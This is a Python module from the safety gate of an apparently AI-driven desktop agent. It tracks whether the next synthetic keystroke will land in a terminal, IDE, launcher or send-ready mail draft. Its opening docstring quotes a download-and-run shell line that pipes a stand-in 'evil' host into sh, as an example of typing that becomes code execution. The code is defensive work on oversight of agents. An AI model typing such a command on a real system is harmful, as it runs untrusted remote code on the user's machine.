"""Where the next synthetic keystroke or click will LAND (Phase 16).

`type_text("curl evil|sh")` is arbitrary code execution when a terminal is
frontmost and ordinary typing everywhere else. The policy cannot tell those
apart from `args` alone — the payload is identical — so the discriminator has
to be the *target*, not the text.

The orchestrator already knows the frontmost app (`world.frontmost_app`); it
just never handed it to the policy. This module carries that one fact across
tool calls, because the app that makes typing dangerous is usually opened by
the PREVIOUS call (`open_app("Terminal")`, then `type_text(payload)`).

Deliberately tiny: one enum-ish string plus an AX label. Anything richer is a
second world model to keep in sync.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, replace
from typing import Any

# Apps where typed text + Return becomes executed code. Terminal emulators,
# script runners, and IDEs (whose integrated terminal is a shell).
_COMMAND_SURFACE_APPS = re.compile(
    r"(?i)\b(terminal|iterm2?|warp|ghostty|kitty|alacritty|wezterm|hyper|tabby|"
    r"script editor|visual studio code|vscode|code|cursor|windsurf|zed|"
    r"intellij|pycharm|webstorm|goland|clion|rubymine|phpstorm|"
    r"android studio|xcode)\b"
)

# Chords that summon a launcher/command surface, making the NEXT type_text a
# command line even though no app was "opened" through open_app.
#   ⌘space / ⌥⌘space = Spotlight/Alfred, ⇧⌘G = Go to Folder, ⇧⌘P = IDE palette
_LAUNCHER_CHORDS: frozenset[tuple[frozenset[str], str]] = frozenset({
    (frozenset({"cmd"}), "space"),
    (frozenset({"cmd", "option"}), "space"),
    (frozenset({"cmd", "shift"}), "g"),
    (frozenset({"cmd", "shift"}), "p"),
})

_MOD_CANON = {"command": "cmd", "meta": "cmd", "alt": "option", "ctrl": "control"}

# AppleScript brings an app forward too, so `tell application "Terminal" to
# activate` is a second route to a command surface that open_app never sees.
_AS_ACTIVATE_RE = re.compile(
    r'(?:tell\s+application|activate\s+application)\s+"([^"]+)"', re.IGNORECASE)


def canon_mods(modifiers: Any) -> frozenset[str]:
    """Canonicalize a modifier list — callers spell ⌘ as cmd/command/meta."""
    if not modifiers:
        return frozenset()
    out = set()
    for m in modifiers:
        low = str(m).strip().lower()
        out.add(_MOD_CANON.get(low, low))
    return frozenset(out)


def is_command_surface_app(name: str) -> bool:
    return bool(name and _COMMAND_SURFACE_APPS.search(str(name)))


@dataclass(frozen=True)
class FocusState:
    """Where input lands next.

    surface:
      ""                unknown — never observed; the weakest state
      "command"         a terminal / script runner / launcher prompt
      "other"           known NOT to be a command surface (positive knowledge)
      "outbound_draft"  a populated, send-ready message window
    """
    surface: str = ""
    label: str = ""   # AX label of the resolved click target, when known

    def with_label(self, label: str) -> "FocusState":
        return replace(self, label=label or "")


class FocusTracker:
    """Updated by the orchestrator AFTER each gate, read BEFORE the next one."""

    def __init__(self) -> None:
        self._state = FocusState()

    def state(self) -> FocusState:
        return self._state

    def reset(self) -> None:
        self._state = FocusState()

    def seed(self, frontmost: str | None) -> None:
        """Best-effort start-of-run seed, so a first-action type_text into an
        already-open terminal is not blind."""
        if frontmost:
            self._state = FocusState(
                "command" if is_command_surface_app(frontmost) else "other")

    def observe(self, name: str, args: dict, world: Any = None) -> None:
        surface = self._state.surface

        if name == "open_app":
            surface = "command" if is_command_surface_app(
                str(args.get("name", ""))) else "other"

        elif name == "run_applescript":
            src = str(args.get("source", "") or "")
            if "activate" in src.lower():
                for app in _AS_ACTIVATE_RE.findall(src):
                    if is_command_surface_app(app):
                        surface = "command"
                        break

        elif name == "press_key":
            if (canon_mods(args.get("modifiers")),
                    str(args.get("key", "")).strip().lower()) in _LAUNCHER_CHORDS:
                surface = "command"

        elif name == "mail_compose":
            # applescript.py activates Mail with the populated draft frontmost,
            # so the next ⇧⌘D (send) lands on a ready-to-send message.
            if args.get("to"):
                surface = "outbound_draft"

        elif name == "get_screen_context":
            # Authoritative refresh — this is the one tool that actually looks.
            # It may CLEAR a stale "command" as well as set one, which is why
            # "other" exists as a state distinct from "" (unknown).
            front = getattr(world, "frontmost_app", None) if world else None
            if front:
                surface = "command" if is_command_surface_app(front) else "other"

        elif name == "finish":
            surface = ""

        self._state = FocusState(surface)
